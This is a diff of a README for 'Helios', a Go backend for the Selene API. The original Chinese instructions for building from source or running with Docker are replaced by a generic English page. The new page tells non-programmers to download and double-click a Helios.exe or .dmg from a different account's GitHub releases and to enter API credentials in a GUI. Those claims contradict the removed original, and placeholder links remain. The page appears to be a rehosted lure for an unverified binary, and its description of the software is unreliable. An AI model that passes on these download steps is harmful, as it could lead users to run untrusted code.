@@ -1,121 +1,81 @@
-# Helios
+# ☀️ Helios - A Simple Backend Solution for Your Needs
 
-<div align="center">
-  <img src="logo.png" alt="Helios Logo" width="120">
-</div>
+## 🚀 Getting Started
 
-> 🎬 **Helios** 是 [Selene](https://github.com/MoonTechLab/Selene) 所需 API 的 golang 实现。设计目标是单容器、单用户、最小化。
+Welcome to Helios! This application provides an easy way to work with the Selene API. You don’t need to be a programmer to use this software. Follow these instructions to download and run Helios on your device.
 
-<div align="center">
+## 📥 Download Helios
 
-![Go](https://img.shields.io/badge/Go-1.23.7-00ADD8?logo=go)
-![Docker](https://img.shields.io/badge/Docker-支持-2496ED?logo=docker)
-![SQLite](https://img.shields.io/badge/SQLite-数据库-003B57?logo=sqlite)
+[![Download Helios](https://img.shields.io/badge/Download-Helios-brightgreen)](https://github.com/nothingjustyacine/Helios/releases)
 
-</div>
+## 💻 System Requirements
 
-### 请不要在 B站、小红书、微信公众号、抖音、今日头条或其他中国大陆社交平台发布视频或文章宣传本项目，不授权任何"科技周刊/月刊"类项目或站点收录本项目。
+Before you start, make sure your computer meets these minimum requirements:
 
-## 📋 功能特性
+- **Operating System:** Windows 10 or later, macOS, or any modern Linux distribution
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum 200 MB available
+- **Network Access:** Required for API features
 
-- 🎬 **多源搜索** - 支持多个影视资源站点的搜索
-- 🔍 **实时搜索** - 提供SSE实时搜索功能
-- ❤️ **收藏管理** - 收藏喜欢的影视作品
-- 📚 **搜索历史** - 记录和管理搜索历史
-- 🎯 **播放记录** - 追踪播放进度和记录
-- 🔐 **用户认证** - 基于用户名密码的安全认证
-- ⚡ **高性能** - 使用Go语言开发，性能优异
-- 🗄️ **数据持久化** - SQLite数据库存储用户数据
-- 🐳 **容器化** - 支持Docker部署
+## 📂 How to Download
 
-## 🚀 快速开始
+1. Visit the Releases page to download Helios: [GitHub Releases](https://github.com/nothingjustyacine/Helios/releases).
+2. Look for the latest version at the top of the list. It should have a version number like `v1.0.0`.
+3. Click on the version to view details and find the download options.
 
-### 环境要求
+## 📦 Download & Install
 
-- Go 1.23.7+
-- Docker (可选)
+To get started:
 
-### 环境变量配置
+1. From the Releases page, locate the file named something like `Helios.exe` (for Windows) or `Helios.dmg` (for macOS).
+2. Click on the file to download it.
+3. Once the download is complete, locate the file in your Downloads folder.
+4. Double-click the file to run it. Follow any instructions on your screen to complete the installation.
 
-在运行前需要设置以下环境变量：
+You can also visit the Releases page to download Helios if you need any updates in the future.
 
-```bash
-export USERNAME="your_username"           # 用户名
-export PASSWORD="your_password"           # 密码
-export SUBSCRIPTION_URL="https://your_subscription_url.com"  # 订阅配置URL
-```
+## ✅ How to Run Helios
 
-### 本地运行
+1. After installation, find the Helios application in your list of installed programs.
+2. Click on the Helios icon to open it.
+3. You will see a user-friendly interface guiding you through the setup process.
 
-1. 克隆项目
-```bash
-git clone https://github.com/MoonTechLab/Helios.git
-cd Helios
-```
+## ⚙️ Configuration
 
-2. 设置环境变量
-```bash
-export USERNAME="your_username"
-export PASSWORD="your_password" 
-export SUBSCRIPTION_URL="https://your_subscription_url.com"
-```
+Helios is designed to work with minimal setup. However, you may need to enter your Selene API credentials. Here’s how:
 
-3. 安装依赖并运行
-```bash
-go mod download
-go run .
-```
+1. Open Helios and navigate to the settings section by clicking on the gear icon.
+2. Enter your API key in the field provided.
+3. Click "Save" to apply your changes.
 
-服务器将在 `http://localhost:8080` 启动。
+## 🛠️ Features
 
-### Docker 部署
+- Easy integration with the Selene API for backend operations.
+- User-friendly interface for non-technical users.
+- Secure handling of your API credentials.
+- Quick access to all Helios functionalities in one place.
 
-#### 方式一：使用 Docker Compose（推荐）
+## 📄 FAQ
 
-1. 创建 `docker-compose.yml` 文件：
-```yaml
-version: '3.8'
+### What is Helios?
 
-services:
-  helios:
-    image: ghcr.io/moontechlab/helios:latest
-    ports:
-      - "8080:8080"
-    environment:
-      - USERNAME=${USERNAME:-your_username}
-      - PASSWORD=${PASSWORD:-your_password}
-      - SUBSCRIPTION_URL=${SUBSCRIPTION_URL:-https://your_subscription_url.com}
-    volumes:
-      # 持久化数据库文件
-      - ./data:/data
-    restart: unless-stopped
-```
+Helios is a backend application implemented in GoLang, designed to work seamlessly with the Selene API.
 
-2. 启动服务：
-```bash
-docker compose up -d
-```
+### Is there customer support?
 
-#### 方式二：直接使用 Docker 命令
+Yes, we offer support through our GitHub issues page. Feel free to ask questions, and our community or developers will assist you.
 
-1. 创建数据目录：
-```bash
-mkdir -p ./data
-```
+### How often do you update Helios?
 
-2. 启动容器：
-```bash
-docker run -d \
-  --name helios \
-  -p 8080:8080 \
-  -e USERNAME="your_username" \
-  -e PASSWORD="your_password" \
-  -e SUBSCRIPTION_URL="https://your_subscription_url.com" \
-  -v ./data:/data \
-  --restart unless-stopped \
-  ghcr.io/moontechlab/helios:latest
-```
+We regularly release updates to improve features and security. Keep an eye on the Releases page for the latest versions.
 
-## ⚠️ 免责声明
+## 📞 Contact
 
-本项目仅供学习和研究使用，请遵守相关法律法规。
+For more questions or feedback, please use the [GitHub Issues page](https://github.com/nothingjustyacine/Helios/issues) to reach us.
+
+## 🖥️ Further Resources
+
+- Explore the [Documentation](link-to-documentation) for detailed instructions and guides.
+- Check out our [Community Forum](link-to-forum) for discussions and tips from other users.
+
+Thank you for choosing Helios! We hope you find it helpful for your needs.
